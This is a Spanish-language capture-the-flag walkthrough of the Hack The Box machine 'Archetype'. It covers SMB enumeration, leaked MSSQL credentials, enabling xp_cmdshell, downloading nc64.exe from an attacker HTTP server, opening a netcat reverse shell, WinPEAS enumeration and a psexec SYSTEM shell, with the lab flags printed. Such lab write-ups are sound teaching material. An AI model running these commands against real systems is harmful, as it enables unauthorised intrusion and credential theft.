---
title: Archetype HTB
date: 2023-02-07
---

## Fase de reconocimiento

Comenzamos comprobando que la máquina se encuentra activa con `ping`, y en base al ttl, sospechamos que se trata de una máquina windows. A continuación tratamos de buscar puertos abiertos con [[nmap]]:

```shell
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn <ip>
```

Obteniendo:

```shell
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

Seguidamente, tratamos de obtener información más detallada sobre los servicios que corren en los puertos abiertos:

```shell
nmap -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -sCV <ip>
```

Obteniendo:

```shell
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-07T13:00:12
|_Not valid after:  2053-02-07T13:00:12
|_ssl-date: 2023-02-07T13:35:49+00:00; 0s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| ms-sql-info: 
|   10.129.80.88:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-07T05:35:42-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-07T13:35:39
|_  start_date: N/A

```

Vemos entre otras cosas, un servidor de base de datos en el puerto 1433, y el servicio smb, que no requiere de contraseña.

### Listando los recursos compartidos con smb

Para ver los recursos disponibles haremos uso de *smbclient*:

```shell
sudo smbclient -N -L \\\\<ip>\\
```

Con `-N` indicamos que nos conectaremos sin contraseña (*no password*), y con `-L` indicamos que queremos listar qué servicios hay disponibles (*list*). Obtenemos:

```shell
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Donde vemos un recurso que no requiere privilegios, *backups*, por lo que tratamos de acceder a él:

```shell
smbclient -N \\\\<ip>\\backups
```

Nos conectamos y descargamos el archivo que contiene:

```shell
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
		
		5056511 blocks of size 4096. 2615627 blocks available

smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2,7 KiloBytes/sec) (average 2,7 KiloBytes/sec)

smb: \> exit
```

Si una vez en nuestro equipo tratamos de listarlo:

```xml
cat prod.dtsConfig

<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Vemos unas credenciales para el usuario `sql_svc`, con contraseña `M3g4c0rp123`, alojado en el host  `ARCHETYPE`. En este punto, deberíamos comprobar si las credenciales corresponden al servicio de base de datos que corría en el puerto 1433.


## Accediendo al servidor de base de datos

Para acceder al servidor mssql, utilizaremos un script que incluye [[impacket]], llamado `mssqlclient.py`. Y lanzamos el script con:

```shell
python3 mssqlclient.py ARCHETYPE/sql_svc@<ip> -windows-auth
```

Utilizamos el parámetro `-windows-auth` para que utilice el sistema de autenticación de windows. Nos pedirá la contraseña que encontramos antes y debería darnos acceso a un servicio de base de datos.

```shell
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
```

## Consiguiendo RCE (ejecución remota de comandos)

Una vez dentro podemos tratar de mostrar el menú de ayuda con `help`, sin embargo, no obtenemos información muy relevante. Así que nos toca buscar por nuestra cuenta, en [[1433-ms-sql-s]] estará toda la info.

El primer paso será comprobar si nuestro usuario tiene privilegios de administrador:

```sql
SELECT is_srvrolemember('sysadmin');
```

A lo que nos devuelve `1` (true), lo que nos indica que somos un usuario administrador de la base de datos. En este punto, podríamos probar a ejecutar comandos a través de `xp_cmdshell`. Aunque lo primero es comprobar si está habilitado:


```sql
EXEC xp_cmdshell 'net user';
```

Nos reporta que:

```sql
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Así que lo habilitaremos de la siguiente manera:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Una vez configurado ya podemos ejecutar comandos:

```powershell
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL>
```


## Estableciendo una reverse shell

Ahora ya podemos tratar de establecer una reverse shell. Para ello utilizaremos el binario `nc64.exe`, pero antes debemos ver en qué ruta subirlo:

```powershell
xp_cmdshell "powershell -c pwd"
```

Nos diche estamos en `C:\Windows\system32`, por lo que debemos cambiar dicha ruta antes de subir el [binario](https://github.com/int0x33/nc.exe/blob/master/nc64.exe), haciendo uso de wget y de un servidor http con python:

```shell
#En nuestra máquina
sudo python3 -m http.server 80
```
```powershell
#En la máquina victima
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<nuestra ip>/nc64.exe -outfile nc64.exe"
```

Comprobamos que el servidor python recibe la petición:

```shell
10.129.238.95 - - [07/Feb/2023 22:41:50] "GET /nc64.exe HTTP/1.1" 200 -
```

Ya sólo falta ponernos en escucha con netcat y ejecutar el binario devolviéndonos una `cmd.exe`:

```shell
#Nuestra máquina
sudo nc -lvnp 443
```
```powershell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe  
<nuestra ip> 443"
```

El parámetro `-e` indica que tras conectarnos queremos ejecutar dicho archivo, en este caso una cmd. Una vez lo ejecutemos deberíamos tener una shell en la pestaña donde corría netcat. La flag del usuario debería estar en `C:\Users\sql_svc\Desktop`:

```powershell
C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
```


## Escalada de privilegios

Para escalar privilegios utilizaremos una herramienta llamada [[winPEAS]], que automatizará gran parte del proceso de enumeración de procesos.

Primero debemos transferir el binario a la máquina víctima. Para ello montamos un servidor http con python por el puerto 80, y al igual que antes, utilizamos wget en la máquina víctima:

```shell
sudo python3 -m http.server 80
```
```powershell
wget http://<nuestra ip>/winPEASx64.exe -outfile winPEASx64.exe
```

Igual que antes, el servidor http debería recibir la petición:

```shell
10.129.238.95 - - [07/Feb/2023 23:16:44] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

Una vez subido, lo ejecutamos:

```powershell
.\winPEASx64.exe
```

Debido a que la salida es bastante larga solo pondré algunas lineas importantes:

```
[...]

Current Token privileges
# Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
[...]

PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B
[...]
```

Vemos dos vías potenciales de explotación, por un lado el `SeImpersonatePrivilege` que podría ser vulnerable a un [[Juicy potato]]. Y por otro, un archivo de histórico, similar al `.bash_history` que podría contener credenciales.

Así que lo listamos:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Mostrando:

```powershell
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Y vemos que hay credenciales en texto plano para el usuario `administrator`, con contraseña `MEGACORP_4dm1n!!`.

### Accediendo como administrador

Para conseguir una shell como administrador, utilizaremos otro módulo de [[impacket]], en este caso, `psexec.py`:

```shell
python3 psexec.py administrator@<ip>
```

Lo que nos da una shell de administrador (`nt_autority\system`):

```shell
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

Password:
[*] Requesting shares on 10.129.238.95.....
[*] Found writable share ADMIN$
[*] Uploading file UXJjyeRa.exe
[*] Opening SVCManager on 10.129.238.95.....
[*] Creating service OaSR on 10.129.238.95.....
[*] Starting service OaSR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Ya solo queda buscar la flag que está en `C:\Users\Administrator\Desktop` (`b91ccec3305e98240082d4474b848528`).